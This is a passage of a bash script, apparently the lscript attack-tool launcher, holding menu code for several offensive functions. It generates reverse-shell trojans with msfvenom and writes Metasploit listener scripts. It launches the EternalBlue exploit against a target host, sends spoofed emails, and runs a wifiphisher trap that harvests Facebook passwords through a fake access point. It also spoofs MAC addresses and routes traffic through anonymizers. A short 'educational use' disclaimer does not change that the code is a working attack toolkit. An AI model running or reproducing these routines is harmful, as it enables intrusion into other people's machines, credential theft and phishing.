		echo -e ""$RS" 8"$CE") "$RS"CHAOS"$CE"        Generate payloads/listeners"
	fi
	echo -e ""$YS"back"$CE") Go back"
	echo -e ""$YS"00"$CE") Main menu"
	#echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e KEYLOG
	clear
	if [ "$KEYLOG" = "1" ]
	then
		if [ -d /root/BeeLogger ]
		then
			cd /root/BeeLogger
			python bee.py
			cd
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$KEYLOG" = "8" ]
	then
		if [ -d /root/CHAOS ]
		then
			cd /root/CHAOS
			go run CHAOS.go
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi	
	elif [ "$KEYLOG" = "7" ]
	then
		if [ -f /usr/bin/shellter ]
		then
			shellter
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$KEYLOG" = "2" ]
	then
		if [ -d /root/ezsploit ]
		then
			cd /root/ezsploit/
			./ezsploit.sh
			cd
			#~ echo -e "TUTORIAL AFTER GENERATION OF PAYLOAD"
			#~ echo -e "Open a new terminal and type:"
			#~ echo -e "msfconsole"
			#~ echo -e "use exploit/multi/handler"
			#~ echo -e "THIS DEPENDS ON THE PLAYLOAD TYPE. E.G: FOR ANDROID IS: set payload android/meterpreter/reverse_tcp"
			#~ echo -e "set lhost <YOUR IP HERE>"
			#~ echo -e "set lport 4444"
			#~ echo -e "exploit"
			echo -e "Go to metasploit menu to create a listener(Option "$YS"14"$CE")"
			sleep 2
			echo -e "Press "$YS"any key"$CE" to leave..."
			$READAK
			exec bash "$0"
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$KEYLOG" = "3" ]
	then
		if [ -d /root/pupy ]
		then
			while true
			do
			clear
			echo -e ""$YS" 1"$CE") Generate a payload"
			echo -e ""$YS" 2"$CE") Start listener"
			echo -e ""$YS"back"$CE") Go back"
			echo -e ""$YS"00"$CE") Main menu"
			echo -e ""$YS" 0"$CE") EXIT"
			read -e PUPY
			if [ "$PUPY" = "1" ]
			then
				clear
				echo -e "Choose the target OS:"
				echo -e ""$YS" 1"$CE") Windows"
				echo -e ""$YS" 2"$CE") Linux"
				echo -e ""$YS" 3"$CE") Android"
				echo -e "Choose: "
				read -e TAROS
				if [ "$TAROS" = "1" ]
				then
					TAROS="windows"
				elif [ "$TAROS" = "2" ]
				then
					TAROS="linux"
				elif [ "$TAROS" = "3" ]
				then
					TAROS="android"
				else
					echo -e "Wrong choice.Returning to main manu..."
					sleep 2
					exec bash "$0"
				fi
				clear
				echo -e "Enter your ip: "
				read -e PUPYIP
				clear
				echo -e "Enter your port(e.g: 443): "
				read -e PUPYPORT
				clear
				echo -e "Enter the full output path(e.g: /root/Desktop/payload1.exe)"
				read -e PUPYPATH
				cd /root/pupy/pupy
				./pupygen.py -O $TAROS -o "$PUPYPATH" connect --host "$PUPYIP":"$PUPYPORT"
				cd
			elif [ "$PUPY" = "2" ]
			then
				cd /root/pupy/pupy
				./pupysh.py
			elif [ "$PUPY" = "00" ]
			then
				exec bash "$0"
			elif [ "$PUPY" = "back" ]
			then
				break
			elif [ "$PUPY" = "0" ]
			then
				exit
			fi
			done
		else
				echo -e "$TNI"
				echo -e "$PAKTGB"
				$READAK
		fi
	elif [ "$KEYLOG" = "4" ]
	then
		if [ -d /root/zirikatu ]
		then
			clear
			echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
			sleep 3
			echo -e "You agree with that?("$YS"YES"$CE"/"$YS"*"$CE")"
			read MUSTBEYES
			if [ "$MUSTBEYES" = "YES" ] 
			then 
				clear
				cd /root/zirikatu
				./zirikatu.sh
				cd
			fi
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$KEYLOG" = "5" ]
	then
		if [ -d /root/TheFatRat ]
		then
			fatrat
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$KEYLOG" = "6" ]
	then
		if [ -d /root/Winpayloads ]
		then
			cd /root/Winpayloads
			./WinPayloads.py
			cd
		else
			echo -e "$TNI"
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [ "$KEYLOG" = "00" ]
	then
		clear
		exec bash "$0"
	elif [ "$KEYLOG" = "0" ]
	then
		clear
		exit
	elif [ "$KEYLOG" = "back" ]
	then
		break
	fi
	done
}
function information_gathering
{
	while true 
	do
		clear
		echo -e "---------------------"$RS"Information Gathering"$CE"-----------------------"
		printf '\033]2;INFORMATION GATHERING\a'
		if [ -d /usr/share/sniper ]
		then
			echo -e ""$YS" 1"$CE") Sniper"
		else
			echo -e ""$RS" 1"$CE") "$RS"Sniper"$CE""
		fi
		if [ -d /root/ReconDog ]
		then
			echo -e ""$YS" 2"$CE") ReconDog"
		else
			echo -e ""$RS" 2"$CE") "$RS"ReconDog"$CE""
		fi
		if [ -d /root/RED_HAWK ]
		then
			echo -e ""$YS" 3"$CE") RED HAWK"
		else
			echo -e ""$RS" 3"$CE") "$RS"RED HAWK"$CE""
		fi
		echo -e ""$YS"back"$CE") Go back"
		echo -e ""$YS"00"$CE") Main menu"
		echo -e "Choose: "
		read INFOG
		clear
		if [ $INFOG = 1 ]
		then
			if [ -d /usr/share/sniper ]
			then
				echo -e "Enter the domain you want to scan: "
				read DOMAIN
				clear
				sniper $DOMAIN
			else
				echo -e "$TNI"
				echo -e "$PAKTGB"
				$READAK
			fi
		elif [ $INFOG = 2 ]
		then
			if [ -d /root/ReconDog ]
			then
				cd /root/ReconDog
				python dog.py
				cd
			else
				echo -e "$TNI"
				echo -e "$PAKTGB"
				$READAK
			fi
		elif [ $INFOG = 3 ]
		then
			if [ -d /root/RED_HAWK ]
			then
				cd /root/RED_HAWK
				php rhawk.php
				cd
			else
				echo -e "$TNI"
				echo -e "$PAKTGB"
				$READAK
			fi
		elif [ $INFOG = 0 ]
		then
			exit
		elif [ $INFOG = 00 ]
		then
			exec bash $0
		elif [ $INFOG = "back" ]
		then
			break
		fi
	done
}
function metasploit_menu
{
	if [ ! -d "$LPATH"/rc ]
	then
		mkdir "$LPATH"/rc
	fi
	while true
	do
	clear
	echo -e "---------------------------"$RS"METASPLOIT"$CE"----------------------------"
	printf '\033]2;METASPLOIT\a'
	echo -e ""$YS" 1"$CE") Create payload with msfvenom"
	echo -e ""$YS" 2"$CE") Create listener"
	echo -e ""$YS" 3"$CE") Saved listeners"
	echo -e ""$YS" 4"$CE") Start msfconsole"
	echo -e ""$YS" 5"$CE") Update msfconsole"
	echo -e ""$YS" 6"$CE") Armitage"
	echo -e ""$YS"back"$CE") Go back"
	echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e METASP
	clear
	if [ "$METASP" = "1" ]
	then
		PAYLOADL=""
		echo -e "PAYLOAD (Default: "$YS"windows/meterpreter/reverse_tcp"$CE"): "
		read PAYLOADL
		if [ -z "$PAYLOADL" ]
		then
			echo -e "Setting PAYLOAD to windows/meterpreter/reverse_tcp"
			sleep 2
			PAYLOADL="windows/meterpreter/reverse_tcp"
		fi
		echo -e "LHOST: "
		read ATIP
		echo -e ""
		echo -e "LPORT: "
		read ATPORT
		echo -e ""
		echo -e "Enter the target's architecture("$YS"x86"$CE"/"$YS"x64"$CE"): "
		read TARCH
		echo -e "Enter the name of the payload(e.g: "$YS"trojan2"$CE"): "
		read ATEXE
		ATEXEPATH="/root/Desktop/$ATEXE.exe"
		clear
		echo -e "Generating"
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		if [ "$TARCH" = "x64" ]
		then
			msfvenom -p $PAYLOADL --platform windows -a x64 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
		else
			msfvenom -p $PAYLOADL --platform windows -a x86 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
		fi
		echo -e "Done."
		echo -e ""
		echo -e "$PAKTC"
		$READAK
		clear
		echo -e "Create a listener for this payload? $YNYES "
		read PAYL
		if [ "$PAYL" != "n" ]
		then
			echo -e "Name of listener(e.g: "$YS"john"$CE") : "
			read NAMEL
			echo "use exploit/multi/handler" > "$LPATH"/rc/"$NAMEL".rc
			echo "set PAYLOAD $PAYLOADL " >> "$LPATH"/rc/"$NAMEL".rc
			echo "set LHOST $ATIP " >> "$LPATH"/rc/"$NAMEL".rc
			echo "set LPORT $ATPORT " >> "$LPATH"/rc/"$NAMEL".rc
			echo "set ExitOnSession false" >> "$LPATH"/rc/"$NAMEL".rc
			echo "exploit -j" >> "$LPATH"/rc/"$NAMEL".rc
			clear
			echo -e "Launch the listener now? "$YNONLY""
			read LLN
			if [ "$LLN" = "y" ]
			then
				echo -e "Launching msfconsole..."
				sleep 2
				clear
				msfconsole -r "$LPATH"/rc/"$NAMEL".rc
			fi
		fi
	elif [ "$METASP" = "z" ]
	then
		clear
		echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
		sleep 3
		echo -e "You agree with that?("$YS"YES"$CE"/"$YS"*"$CE")"
		read MUSTBEYES
		if [ "$MUSTBEYES" = "YES" ] 
		then 
			clear
			cd /root/zirikatu
			./zirikatu.sh
		fi
	elif [ "$METASP" = "2" ]
	then
		clear
		echo -e "LHOST: "
		read LHOSTL
		echo -e "LPORT: "
		read LPORTL
		echo -e "PAYLOAD (Default: "$YS"windows/meterpreter/reverse_tcp"$CE"): "
		read PAYLOADL
		if [ -z "$PAYLOADL" ]
		then
			echo -e "Setting PAYLOAD to windows/meterpreter/reverse_tcp"
			sleep 2
			PAYLOADL="windows/meterpreter/reverse_tcp"
		fi
		echo -e "Name of listener(e.g: "$YS"john"$CE") : "
		read NAMEL
		echo "use exploit/multi/handler" > "$LPATH"/rc/"$NAMEL".rc
		echo "set PAYLOAD $PAYLOADL " >> "$LPATH"/rc/"$NAMEL".rc
		echo "set LHOST $LHOSTL " >> "$LPATH"/rc/"$NAMEL".rc
		echo "set LPORT $LPORTL " >> "$LPATH"/rc/"$NAMEL".rc
		echo "set ExitOnSession false" >> "$LPATH"/rc/"$NAMEL".rc
		echo "exploit -j" >> "$LPATH"/rc/"$NAMEL".rc
		clear
		echo -e "Launch the listener now? "$YNONLY""
		read LLN
		if [ "$LLN" = "y" ]
		then
			echo -e "Launching msfconsole..."
			sleep 2
			clear
			msfconsole -r "$LPATH"/rc/"$NAMEL".rc
		fi
	elif [ "$METASP" = "3" ]
	then
		while true
		do
		clear
		ls -w 1 "$LPATH"/rc
		echo -e ""
		echo -e ""
		echo -e "Enter the name of the listener you want to select(e.g: "$YS"john"$CE")"
		echo -e ""$YS"reset"$CE") Delete all saved listeners"
		echo -e ""$YS" back"$CE") Go back"
		read NAMERC
		clear
		if [ "$NAMERC" = "back" ]
		then
			break
		elif [ "$NAMERC" = "reset" ]
		then
			rm -f "$LPATH"/rc/*
			continue
		fi
		if [ ! -f "$LPATH"/rc/"$NAMERC" ]
		then
			NAMERC="$NAMERC".rc
			if [ ! -f "$LPATH"/rc/"$NAMERC" ]
			then
				echo -e "File not found. Try again.."
				sleep 2
				continue
			fi
		fi
		while true
		do
		clear
		echo -e ""$NAMERC" selected."
		echo -e ""$YS" 1"$CE") Start listener"
		echo -e ""$YS" 2"$CE") Delete listener"
		echo -e ""$YS"back"$CE") Go back"
		echo -e "Choose: "
		read LISTL
		if [ "$LISTL" = "1" ]
		then
			msfconsole -r "$LPATH"/rc/"$NAMERC"
		elif [ "$LISTL" = "2" ]
		then
			rm "$LPATH"/rc/"$NAMERC"
			break
		elif [ "$LISTL" = "back" ]
		then
			break
		fi
		done
		done
	elif [ "$METASP" = "4" ]
	then
		msfconsole
	elif [ "$METASP" = "5" ]
	then
		msfupdate
	elif [ "$METASP" = "6" ]
	then
		service postgresql start
		armitage
		clear
	elif [ "$METASP" = "back" ]
	then
		BACKL="1"
		break
	elif [ "$METASP" = "00" ]
	then
		exec bash "$0"
	elif [ "$METASP" = "0" ]
	then
		clear
		exit
	fi
	done
}
function update_lscript
{
	echo -e "Checking for updates..."
	TESTINTERNETCONNECTION=$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')
	if [ "$TESTINTERNETCONNECTION" != "" ]
	then
		VER=$(timeout -s SIGTERM 20 curl "https://raw.githubusercontent.com/arismelachroinos/lscript/master/version.txt" 2>/dev/null)
		if [ "$VERSION" != "$VER" ]
		then
		clear
		echo -e "There is an update available."
		echo -e "Current version: $VERSION"
		echo -e "Updated version: $VER"
		echo -e "$PAKTC"
		$READAK
		clear
		echo -e "Do you want to update?"$YNONLY": "
		read UPDATEYN
		if [ "$UPDATEYN" = "y" ]
		then
			clear
			echo -e "Making new directory for the old lscript (will pass it to /root/lscriptold)"
			sleep 2
			mkdir /root/lscriptold
			echo -e ""
			echo -e "Moving lscript to lscriptold"
			sleep 2
			mv "$LPATH" /root/lscriptold
			echo -e "Cloning the latest github version to new "$LPATH""
			sleep 2
			cd
			git clone https://github.com/arismelachroinos/lscript.git
			cd "$LPATH"
			chmod +x install.sh
			clear
			if [ -d /root/lscriptold/lscript/ks ]
			then
				cp /root/lscriptold/lscript/ks "$LPATH"
			fi
			echo -e "Ok , everything seems to be fine by now."
			sleep 1
			echo -e "A new terminal will open, and then the new install.sh will run to update the lscript.I will close."
			echo -e ""
			sleep 4
			echo -e "$PAKTC"
			$READAK
			cd "$LPATH"
			gnome-terminal -e ./install.sh
			clear 
			if [ -d /root/lscriptold/ks ]
			then
				echo -e "Copying old shortcuts"
				cp /root/lscriptold/ks "$LPATH"
				sleep 1
				echo -e "Done."
				sleep 1
				clear
			fi
			sleep 1
			echo -e ""
			echo -e "Removing old lscript"
			rm -rf /root/lscriptold
			echo -e "Exiting..."
			sleep 1
			exit
		else 
			clear
			echo -e "You didnt select "y" so you go back..."
			sleep 3
			exec bash "$0"
		fi
		else
		echo -e "There is no update available"
		sleep 1
		echo -e "Installed version: $VERSION"
		sleep 1
		echo -e "Github version:    $VER"
		sleep 1
		echo -e "$PAKTGB"
		$READAK	
		exec bash "$0"
		fi
	else
		clear
		echo -e "There is no connection."
		sleep 1
		echo -e "Maybe you should type 'stop' in the main manu to gain internet access again"
		echo -e ""
		echo -e "$PAKTGB"
		$READAK
		exec bash "$0"
	fi	
}
function hidden_shortcuts
{
	clear
	echo -e ""$YS"  interface"$CE") Change your interface"
	echo -e ""$YS"     wififb"$CE") Create open wifi access point and get fb passwords with wifiphisher"
	echo -e ""$YS"eternalblue"$CE") Launch msfconsole with eternalblue exploit on target"
	echo -e ""$YS"  etercheck"$CE") Check if a target is vulnerable to eternalblue exploit"
	echo -e ""$YS"  changelog"$CE") View the changelog of the lscript versions"
	echo -e "$PAKTGB"
	$READAK
	clear
}
function one_time_per_launch_ks
{
	if [ -d ""$KSPATH"/nums" ]
	then
		rm -r "$KSPATH"/nums
	fi
	mkdir "$KSPATH"/nums
	nn=1
	ff=1
	HOWMANY=0
	HOWADD=$(( HOWMANYTOOLS + 1 )) 
	while [ "$nn" != "$HOWADD" ]
	do
		listshortcuts
		if [ -f ""$KSPATH"/"$TITLE"/"$TITLE"ks.txt" ]
		then
				echo -e "$TITLE" > "$KSPATH"/nums/"$ff".txt
				ff=$(( ff+1 ))
				HOWMANY=$(( HOWMANY+1 ))		
		fi
		nn=$(( nn+1 ))

	done
	ONETIMEPERLAUNCH="1"
}
function interface_menu
{
	WLANN=$(cat "$LPATH"/wlan.txt)
	WLANNM=$(cat "$LPATH"/wlanmon.txt)
	echo -e "Your current wireless interface names are $WLANN and $WLANNM"
	sleep 2
	echo -e "Do you want to change you interface names?"$YNYES": "
	read INAG
	if [ "$INAG" = "n" ]
	then
		clear
		echo -e "Then why did you come here? lol"
		sleep 3
		exec bash "$0"
	else
		clear
		rm "$LPATH"/wlan.txt
		rm "$LPATH"/wlanmon.txt
		set_interface_number
	fi
}
function tools_menu
{
	while true
	do
	echo -e "------------------------------"$RS"TOOLS"$CE"------------------------------"
	printf '\033]2;TOOLS\a'
	echo -e ""$YS" 1"$CE") Wifi tools"
	echo -e ""$YS" 2"$CE") Remote access"
	echo -e ""$YS" 3"$CE") Information gathering"
	echo -e ""$YS" 4"$CE") Install/reinstall a tool"
	echo -e ""$YS"back"$CE") Go back"
	echo -e ""$YS"00"$CE") Main menu"
	echo -e ""$YS" 0"$CE") EXIT"
	echo "Choose: "
	read -e CATEG
	clear
		if [ "$CATEG" = "1" ]
		then
			wifi_tools
		elif [ "$CATEG" = "2" ]
		then
			remote_access
		elif [ "$CATEG" = "3" ]
		then
			information_gathering
		elif [ "$CATEG" = "4" ]
		then
			reinstall_tools
		elif [ "$CATEG" = "0" ]
		then
			clear
			exit
		elif [ "$CATEG" = "back" ]
		then
			BACKL="1"
			break
		elif [ "$CATEG" = "00" ]
		then
			clear
			exec bash "$0"
		fi
	done
}
function public_ip
{
	clear
	CHECKMON=$(ifconfig | grep "mon")
	if [ "$CHECKMON" = "" ]
	then
		PUBLICIP=$(curl -s ipinfo.io/ip)
		echo "Your public IP is: "$PUBLICIP""
		#~ curl ipinfo.io/ip
		#~ curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'
	else
		echo -e "When monitor mode is enabled, you don't have internet access."
		echo -e "Select 'd2' to disable monitor mode"
		echo -e "$PAKTGB"
		$READAK
		clear
		exec bash "$0"
	fi
}
function terms_of_use
{
	printf '\033]2;TERMS OF USE\a'
	clear
	echo -e ""$RS"You need to accept the terms."$CE""
	sleep 1
	echo -e "$PAKTC"
	$READAK
	clear
	echo -e "This tool is only for educational purposes only."
	sleep 2
	echo -e "Use this tool only on your own network and never without permission."
	sleep 2
	echo -e "I am not responsible for anything you do with this tool."
	sleep 2
	echo -e "Will you use this tool only on your own network and only with your own responsibility?("$YS"YES"$CE"/"$YS"NO"$CE"): "
	read YESORNO
	if [ "$YESORNO" = "YES" ]
	then 
		echo "You have agreed the terms and you use this tool with your own responsibility." > "$LPATH"/IAGREE.txt
		sleep 1
		clear
	else
		echo -e "You didn't type 'YES' , so you cannot continue"
		sleep 4
	fi
	exec bash "$0"
}
function eternalblue
{
	if [ ! -d "$LPATH"/rce ]
	then
		mkdir	"$LPATH"/rce
	fi
	echo -e "LHOST: "
	read LHOSTL
	echo -e "RHOST: "
	read RHOSTL
	echo -e "TARGETARCHITECTURE("$YS"x86"$CE"/"$YS"x64"$CE"): "
	read TARGETARCHL
	if [ "$TARGETARCHL" = "x64" ]
	then
		PROCESSINJECTL="lsass.exe"
		PAYLOADL="windows/x64/meterpreter/reverse_tcp"
	else
		PAYLOADL="windows/meterpreter/reverse_tcp"
	fi
	echo -e "TARGET("$YS"0"$CE"-"$YS"8"$CE"): "
	read TARGETL
	echo "use exploit/windows/smb/eternalblue_doublepulsar" > "$LPATH"/rce/eternalbluerc.rc
	echo "set LHOST "$LHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set RHOST "$RHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set PAYLOAD "$PAYLOADL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set TARGET "$TARGETL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set TARGETARCHITECTURE "$TARGETARCHL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set PROCESSINJECT "$PROCESSINJECTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "show info" >> "$LPATH"/rce/eternalbluerc.rc
	echo "exploit -j" >> "$LPATH"/rce/eternalbluerc.rc
	msfconsole -r "$LPATH"/rce/eternalbluerc.rc
	
}
function eternalblue_check
{
	if [ ! -d "$LPATH"/rce ]
	then
		mkdir	"$LPATH"/rce
	fi
	echo -e "RHOST: "
	read RHOSTL
	echo "use auxiliary/scanner/smb/smb_ms17_010" > "$LPATH"/rce/eternalbluerc.rc
	echo "set RHOSTS "$RHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "exploit" >> "$LPATH"/rce/eternalbluerc.rc
	msfconsole -r "$LPATH"/rce/eternalbluerc.rc
	
}
function start_menu
{
	enable_wlan
	echo -e "Enabling $WLANNM..."
	echo -e "Killing services..."
	airmon-ng check kill | grep "nothing"
	echo -e "Done."
	echo -e "Starting monitor mode..."
	airmon-ng start $WLANN | grep "monitor mode" | awk -F "(" {'print $2'} | cut -d ')' -f1
	echo -e "Done."
	echo -e "Changing mac address of $WLANNM to 00:11:22:33:44:55..."
	ifconfig $WLANNM down
	macchanger -m 00:11:22:33:44:55 $WLANNM | grep "New MAC:" 
	ifconfig $WLANNM up
	echo -e "Done."
}
function stop_menu
{
	stop_monitor
	echo -e "Changing mac address of $WLANN to the original one..."
	ifconfig $WLANN down
	macchanger -p $WLANN | grep "Current MAC:"
	ifconfig $WLANN up
	echo -e "SUCCESS!"
}
function spoof_email
{
while true
do
	sm=0
	clear
	if [ ! -d /bin/lscript/smtp ]
	then
		mkdir /bin/lscript/smtp
	fi
	echo -e ""$RS"YOU SHOULD FIRST SIGN UP ON https://www.smtp2go.com AND VERIFY YOUR EMAIL."$CE""
	echo -e ""$RS"THEN GO TO https://app.smtp2go.com/settings/users AND MAKE A USERNAME AND PASS."$CE""
	echo -e ""$RS"      ########ALWAYS HAVE PERMISSION OF THE EMAILS YOU SPOOF########"$CE""
	echo -e ""$RS"      ########DONT SEND VIRUSES , PHISHING OR ILLEGAL THINGS########"$CE""
	if [ ! -f /bin/lscript/smtp/smtpemail.txt ]
	then
		echo -e ""$YS" 1"$CE") Set your SMTP username and pass     "$RS"NOT SET"$CE""
	else
		read smtpemail < /bin/lscript/smtp/smtpemail.txt
		echo -e ""$YS" 1"$CE") Set your SMTP username and pass     Current: "$YS""$smtpemail""$CE""
	fi
	echo -e ""$YS" 2"$CE") Send a spoofed email"
	echo -e ""$YS" 3"$CE") Clear your SMTP username and pass from lscript"
	echo -e ""$YS" 4"$CE") Fix email failed"
	echo -e ""$YS"back"$CE") Go back"
	echo -e ""$YS" 0"$CE") EXIT"
	read SMTP
	if [ "$SMTP" = "1" ]
	then
		clear
		echo -e "Enter your smtp username(find it here: https://app.smtp2go.com/settings/users ): "
		read SMTPEMAIL
		echo -e "Enter your smtp password(find it here: https://app.smtp2go.com/settings/users ): "
		read SMTPPASS
		clear
		echo "$SMTPEMAIL" > /bin/lscript/smtp/smtpemail.txt
		echo "$SMTPPASS" > /bin/lscript/smtp/smtppass.txt 
		echo -e "Credentials saved on /bin/lscript/smtp"
		sleep 3
	elif [ "$SMTP" = "4" ]
	then
		clear	
		echo -e "If you email fails, the reason is because on option 1 you didnt set the correct username and password. Find those at https://app.smtp2go.com/settings/users."
		sleep 2
		echo -e "$PAKTGB"
		read -e -n 1 -r
	elif [ "$SMTP" = "3" ]
	then
		if [ -f /bin/lscript/smtp/smtpemail.txt ]
		then
			rm /bin/lscript/smtp/smtpemail.txt
			echo -e "Username removed"
		else
			echo -e "Not username found"
		fi
		if [ -f /bin/lscript/smtp/smtppass.txt ]
		then
			rm /bin/lscript/smtp/smtppass.txt
			echo -e "Password removed"
		else
			echo -e "Not password found"
		fi
		sleep 2
		continue
	elif [ "$SMTP" = "0" ]
	then
		clear
		exit
	elif [ "$SMTP" = "back" ]
	then
		clear
		break
	elif [ "$SMTP" = "2" ]
	then
		while true
		do
		clear
		if [ ! -f /bin/lscript/smtp/smtpemail.txt ]
		then
			echo -e "No smtp username found."
			sm=1
		fi
		if [ ! -f /bin/lscript/smtp/smtppass.txt ]
		then
			echo -e "No smtp pass found."
			sm=1
		fi
		if [ "$sm" = 1 ]
		then
			break
		fi
		read smtppass < /bin/lscript/smtp/smtppass.txt
		read smtpemail < /bin/lscript/smtp/smtpemail.txt
		clear
		echo -e "Your username is "$RS""$smtpemail""$CE""
		echo -e ""
		echo -e "Enter the target's email: "
		read TARGETSEMAIL
		echo -e "Enter the email that you want the target to see: "
		read SPOOFEDEMAIL
		echo -e "Enter the subject of the message: "
		read SUBJECTEMAIL
		echo -e "Enter the message: "
		read MESSAGEEMAIL
		echo -e "Enter the smtp server ("$YS"Enter"$CE"=mail.smtp2go.com): "
		read SMTPSERVER
		if [ "$SMTPSERVER" = "" ]
		then
			SMTPSERVER="mail.smtp2go.com"
		fi
		echo -e "Enter the smtp port ("$YS"Enter"$CE"=2525): "
		read SMTPPORT
		if [ "$SMTPPORT" = "" ]
		then
			SMTPPORT="2525"
		fi
		echo -e "Press "$YS"enter"$CE" to send the message to "$TARGETSEMAIL""
		read 
		clear
		sendemail -f $SPOOFEDEMAIL -t $TARGETSEMAIL -u $SUBJECTEMAIL -m $MESSAGEEMAIL -s "$SMTPSERVER":"$SMTPPORT" -xu "$smtpemail" -xp "$smtppass"
		echo -e "$PAKTGB"
		read -e -n 1 -r
		break
		done
	fi
done
}
function new_terminal
{
		while true
		do
		clear
		CHECKMON=$(ifconfig | grep "mon")
		if [ "$CHECKMON" = "" ]
		then
			echo -e "Monitor mode is not enabled."
			echo -e ""
			echo -e "Do you want to enable monitor mode? "$YNYES": "
			read MONITOREN
			clear
			if [ "$MONITOREN" = "n" ]
			then
			#~ echo -e "Select 'start' or '2' to enable it"
				echo -e "$PAKTGB"
				$READAK
				clear
				exec bash "$0"
			else
				start_menu
				continue
			fi
		else
			if [ "$YORNAA" = "10" ]
			then
				echo -e "Moving into new terminal..."
				sleep 1
				FJC=0
				export FJC
				gnome-terminal --geometry 87x35+9999+0 -e lh1
				sleep 1
				exec bash "$0"
				break
			elif [ "$YORNAA" = "11" ]
			then
				clear
				echo -e "Moving into new terminal..."
				sleep 1
				gnome-terminal --geometry 80x25+9999+0 -e lh3
				sleep 1
				exec bash "$0"
				break
			elif [ "$YORNAA" = "12" ]
			then
				echo -e "Moving into new terminal..."
				sleep 1
				gnome-terminal --geometry 80x25+9999+0 -e lh4
				sleep 1
				exec bash "$0"
				break
			fi
		fi
		done
}
function check_if_ks
{
	while [ $var1 -le $HOWMANY ]
	do
		read TITLE < "$KSPATH"/nums/"$var1".txt
		read YORNAKS < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
		if [ "$YORNAA" = "$YORNAKS" ]
		then
			read COMMAND1 < ""$KSPATH"/"$TITLE"/"$TITLE".txt"
			read COMMAND2 < ""$KSPATH"/"$TITLE"/"$TITLE"2.txt"
			$COMMAND1
			#~ if [ -f ""$KSPATH"/"$TITLE"/"$TITLE"3.txt" ]
			#~ then
				#~ read $COMMAND3 < ""$KSPATH"/"$TITLE"/"$TITLE"3.txt"
				#~ $COMMAND3
			#~ fi
			$COMMAND2
			BACKL="1"
		fi
		var1=$(( var1+1 ))
	done
}
function wififb
{
	echo -e "Enter the name of the access point you want to create: "
	read -e ESSIDAP
	export ESSIDAP
	xterm -geometry 90x60+9999+999999 -e bash -c 'printf "\033]2;WIFI FB TRAP\a" && wifiphisher --nojamming --essid "$ESSIDAP" -p oauth-login; exec bash' & disown 
}
function main_options
{
	if [ "$YORNAA" = "0" ]
	then
		exit
	elif [ "$YORNAA" = "15" ]
	then
		BACKL="1"
		spoof_email
	elif [ "$YORNAA" = "ks" ]
	then
		keyboard_shortcuts
	elif [ "$YORNAA" = "interface" ]
	then
		interface_menu
	elif [ "$YORNAA" = "9" ]
	then
		tools_menu
	elif [ "$YORNAA" = "l" ]
	then
		clear 
		exec bash "$0"
	elif [ "$YORNAA" = "clear" ]
	then
		echo -e "Ok.I can clear for you..."
		sleep 1
		clear
		exec bash "$0"
	elif [ "$YORNAA" = "gg" ]
	then
		geany /bin/lscript/l
	elif [ "$YORNAA" = "1" ]
	then
		enable_wlan
	elif [ "$YORNAA" = "d1" ]
	then
		disable_wlan
	elif [ "$YORNAA" = "2" ]
	then
		echo -e "Enabling $WLANNM..."
		echo -e "Killing services..."
		airmon-ng check kill
		echo -e "Done."
		echo -e "Starting monitor mode..."
		(airmon-ng start $WLANN &>/dev/null && echo -e "Done" ) || echo -e "Error starting monitor mode."
	elif [ "$YORNAA" = "d2" ]
	then
		stop_monitor
		#~ echo -e "$WLANN is probably up.Bring it down?"$YNNO": "
		#~ read -e YORN
		#~ if [ "$YORN" = "y" ] 
		#~ then
			#~ #rfkill unblock wifi
			#~ #rfkill unblock all
			#~ ifconfig $WLANN down
			#~ echo -e "$WLANN is now down."
		#~ fi
	elif [ "$YORNAA" = "3" ]
	then
		change_mac
	elif [ "$YORNAA" = "d3" ]
	then
		interface_selection
		clear
		echo -e "Changing mac address of $MYINT to the original one..."
		ifconfig $MYINT down
		macchanger -p $MYINT
		ifconfig $MYINT up
		echo -e "Done."
	elif [ "$YORNAA" = "4" ]
	then
		if [ ! -f "/etc/init.d/anonym8.sh" ]
		then
			echo -e "Anonym8 is not installed. Go to TOOLS -> Install/reinstall a tool     to install it."
		else
			echo -e "Enabling anonym8..."
			anonym8 start
			echo -e "Done."
		fi
	elif [ "$YORNAA" = "d4" ]
	then
		if [ ! -d "/etc/init.d/anonym8" ]
		then
			echo -e "Anonym8 is not installed. Go to TOOLS -> Install/reinstall a tool     to install it."
		else
			echo -e "Disabling anonym8..."
			anonym8 stop
			echo -e "Done."
		fi
	elif [ "$YORNAA" = "5" ]
	then
		if [ ! -f "/usr/bin/anonsurf" ]
		then
			echo -e "Anonsurf is not installed. Go to TOOLS -> Install/reinstall a tool     to install it."
		else
			echo -e "Enabling anonsurf..."
			anonsurf start
			echo -e "Done."
		fi
	elif [ "$YORNAA" = "d5" ]
	then
		if [ ! -f "/usr/bin/anonsurf" ]
		then
			echo -e "Anonsurf is not installed. Go to TOOLS -> Install/reinstall a tool     to install it."
		else
			echo -e "Disabling anonsurf..."
			anonsurf stop
